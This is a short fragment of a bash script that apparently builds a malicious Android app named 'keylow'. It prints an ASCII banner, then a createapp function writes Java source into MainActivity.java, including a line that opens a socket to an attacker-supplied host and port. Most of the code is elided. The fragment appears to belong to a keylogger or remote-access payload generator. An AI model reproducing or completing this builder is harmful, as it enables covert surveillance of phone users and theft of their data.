...
printf "\e[1;93m ___   _  _______  __   __  ___      _______  _     _ \n"
printf "|   | | ||       ||  | |  ||   |    |       || | _ | |\n"
printf "|   |_| ||    ___||  |_|  ||   |    |   _   || || || |\n"
printf "|      _||   |___ |       ||   |    |  | |  ||       |\n"
printf "|     |_ |    ___||_     _||   |___ |  |_|  ||       |\n"
printf "|    _  ||   |___   |   |  |       ||       ||   _   |\n"
printf "|___| |_||_______|  |___|  |_______||_______||__| |__|\e[0m\n"
printf "\n"
}

createapp() {

printf "package com.keylow;\n" > app/app/src/main/java/com/keylow/MainActivity.java
...
printf "		Socket socket = new Socket(\"%s\", %s);\n" $host $port >> app/app/src/main/java/com/keylow/MainActivity.java
